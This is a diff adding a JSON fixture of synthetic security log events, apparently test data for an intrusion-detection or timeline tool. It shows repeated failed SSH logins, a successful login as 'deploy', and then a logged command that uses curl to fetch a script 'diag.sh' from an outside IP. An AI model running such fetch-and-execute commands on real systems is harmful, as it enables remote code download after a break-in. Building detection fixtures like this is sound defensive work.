@@ -1,0 +1,52 @@
+[
+  {
+    "timestamp": "2026-10-17T18:00:00+00:00",
+    "source": "authentication",
+    "description": "SSH failed for admin from 198.51.100.24"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:05+00:00",
+    "source": "authentication",
+    "description": "SSH failed for admin from 198.51.100.24"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:10+00:00",
+    "source": "authentication",
+    "description": "SSH failed for admin from 198.51.100.24"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:18+00:00",
+    "source": "authentication",
+    "description": "SSH success for deploy from 198.51.100.24"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:21+00:00",
+    "source": "authentication",
+    "description": "SSH success for backup from 192.0.2.80"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:23+00:00",
+    "source": "endpoint",
+    "description": "User deploy executed /bin/bash -c curl http://203.0.113.77/diag.sh (PID 4100, PPID 4000)"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:24+00:00",
+    "source": "endpoint",
+    "description": "User deploy executed curl http://203.0.113.77/diag.sh (PID 4101, PPID 4100)"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:25+00:00",
+    "source": "network",
+    "description": "10.10.20.15 -> 203.0.113.77:80 GET /diag.sh"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:30+00:00",
+    "source": "endpoint",
+    "description": "User root executed /usr/sbin/cron -f (PID 2100, PPID 1)"
+  },
+  {
+    "timestamp": "2026-10-17T18:00:32+00:00",
+    "source": "network",
+    "description": "10.10.20.15 -> 192.0.2.55:443 HTTPS"
+  }
+]
